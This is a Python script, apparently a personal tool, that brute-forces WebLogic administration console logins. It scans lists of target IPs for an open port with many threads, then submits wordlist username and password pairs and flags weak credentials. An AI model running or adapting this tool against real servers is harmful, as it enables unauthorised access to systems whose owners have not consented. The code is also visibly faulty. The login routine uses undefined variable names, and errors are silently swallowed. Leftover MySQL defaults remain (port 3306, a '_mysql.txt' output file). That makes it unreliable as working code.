#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-05-29 20:13:27
# @Author  : crhua 

import sys
import requests
import socket
from threading import Thread
from optparse import OptionParser


"""
brute weblogic login
"""
def brute(ip,port,users,passwds):
	flag_list = ['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/']
	for u in users:
		for p in passwds:
			u = u.strip()
			p = p.strip()
			# print(p)
			try:
				data = 'j_username={0}&j_password={1}&j_character_encoding=UTF-8'.format(user,password)
				url_path = '/console/j_security_check'
				url = 'http://{0}:{1}/{2}'.format(ip,port,url_path)
				res = requests.post(url,data=data,timeout=4)
				rhtml = res.text
				for flag in flag_list:
					if flag in rhtml:
						_t = "[+] success: {0}:{1} 存在weblogic弱口令 {2}:{3}".format(ip,port,u,p)
						result.append(_t)
			except Exception as e:
				pass
				# return

"""
多个目标
"""
def run(func,threadnum,ips,port,user_dic,passwd_dic):
	for i in range(1,threadnum + 1):
		threads = [Thread(target=func,args=(u,port,user_dic,passwd_dic,)) for u in ips]
	for t in threads:
		t.start()
	for t in threads:
		t.join()

"""
扫描开放端口
"""
def scan(ip,port,filename):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(2)
	try:
		res = s.connect_ex((ip,int(port)))
		if res == 0:
			with open(filename,'a+') as f:
				f.write("{0}\n".format(ip))
	except:
		pass


if __name__ == '__main__':
	#帮助
	usage = "Usage: python %prog [options] args"
	parser = OptionParser(usage,version="%prog 0.1 ")
	parser.add_option("-t", dest="host", help="target host")
	parser.add_option("-p", dest="port", default="3306", help="target port")
	parser.add_option("-u", dest="user", help="user dic")
	parser.add_option("-P", dest="passwd", help="passwd dic")
	parser.add_option("-a", dest="hosts" , help="target hosts file")
	options,args = parser.parse_args()

	"""
	获取用户参数 -u -P -p
	"""
	if options.user:
		user = options.user
	else:
		print("Please specify -u parameters")
		sys.exit(0)

	if options.passwd:
		passwd = options.passwd
	else:
		print("Please specify -P parameters")
		sys.exit(0)

	if options.port:
		port = options.port

	"""
	tmp_list 存放所有文件内的ip
	last_list 存放只开放weblogic的ip
	result 结果存放列表
	threadnum 多线程数量
	"""
	tmp_list = []
	last_list = []
	result = []
	threadnum = 10

	with open(user,'r') as f:
		users = f.readlines()
	with open(passwd,'r') as g:
		passwds = g.readlines()
	f.close()
	g.close()

	if options.host:
		host = options.host
		brute(host,port,users,passwds)
	elif options.hosts:
		file_path = options.hosts
		with open(file_path,'r') as f:
			_tmp = f.readlines()
		for i in _tmp:
			i = i.strip()
			tmp_list.append(i)
		f.close()
		# print(tmp_list)
		"""
		多线程获取端口开放
		"""
		file_name = "{0}_mysql.txt".format(port)
		for i in range(10):
			threads = [Thread(target=scan,args=(u,port,file_name,)) for u in tmp_list]
		for t in threads:
			t.start()
		for t in threads:
			t.join()
		print(file_name)

		"""
		暴力破解weblogic
		"""
		with open(file_name,'r') as f:
			_last = f.readlines()
		for i in _last:
			i = i.strip()
			last_list.append(i)
		run(brute,threadnum,last_list,port,users, passwds)
	else:
		print("Error! Please use -h param")

	for m in result:
		print(m)


		

